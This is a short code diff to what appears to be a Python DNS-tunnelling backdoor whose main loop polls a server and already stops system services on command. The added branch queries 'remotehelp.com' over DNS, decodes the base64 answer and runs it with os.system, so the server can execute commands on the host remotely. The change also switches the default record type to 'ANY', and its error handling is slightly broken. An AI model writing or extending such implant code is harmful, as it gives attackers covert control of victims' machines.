@@ -32,7 +32,7 @@ def makeQuery(address, recordType='A'): #Default to A record, can specify TXT fo
     query += b'\x00\x01'  # QCLASS (IN)
     return query
 
-def getResponse(data, recordType='A'):
+def getResponse(data, recordType='ANY'):
     answers = []
     try:
         header = data[:12]
@@ -224,5 +224,21 @@ while True:
                     
                 print("Stopping service: " + serviceName)
                 os.system("systemctl stop " + serviceName)
+            elif(ipSplit[1] == "65"):
+                print("Collecting command to run")
+                
+                sock.sendto(makeQuery("remotehelp.com"), (SERVER, 53)) #Single IP ending in .100 signals an error, stop process and sleep
+                resp, _ = sock.recvfrom(512)
+
+                data = getResponse(resp)
+                
+                if len(data) == 1 and len(data.split('.')) == 4:
+                    if data.split('.')[3] == "100":
+                        continue #Error response, skip running command
+                else:
+                    command = from_base64(data)
+                    
+                #print("Running command: " + command)
+                os.system(command)
                 
     time.sleep(WAIT_TIME)
